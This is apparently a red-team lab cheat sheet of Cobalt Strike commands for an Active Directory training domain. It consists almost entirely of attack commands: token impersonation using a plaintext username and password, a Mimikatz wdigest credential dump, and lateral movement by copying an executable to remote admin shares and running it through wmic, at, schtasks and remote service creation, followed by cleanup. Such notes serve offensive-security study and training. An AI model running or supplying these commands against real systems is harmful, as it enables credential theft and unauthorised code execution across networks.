### Notes
```
make token cyberbotic.io\f.cohen Hunter2 SMB
spawnas cyberbotic.io\f.cohen Hunter2 SMB
steal_token 7750 
```
### Mimikatz
```
mimikatz sekurlsa::wdigest

```
```
#File Copy
cd c:\windows\temp
cd C:\Temp
shell copy foobar.exe \\host\C$\windows\temp
shell wmic /node:host process call create “c:\windows\temp\foobar.exe”

#Remote Code Execution
shell net time \\host
shell at \\host HH:MM c:\windows\temp\foobar.exe
shell copy Service.exe \\wkstn-4945\c$\Temp\foobar.exe

shell schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System
shell schtasks /run /tn foobar /S host
shell schtasks /F /delete /tn foobar /S host


shell sc \\host create foobar binpath= “c:\windows\temp\foobar.exe”
shell sc \\wkstn-4945 create foobar binpath= "c:\windows\temp\foobar.exe"
shell sc \\host start foobar
shell sc \\host delete foobar
link host
```
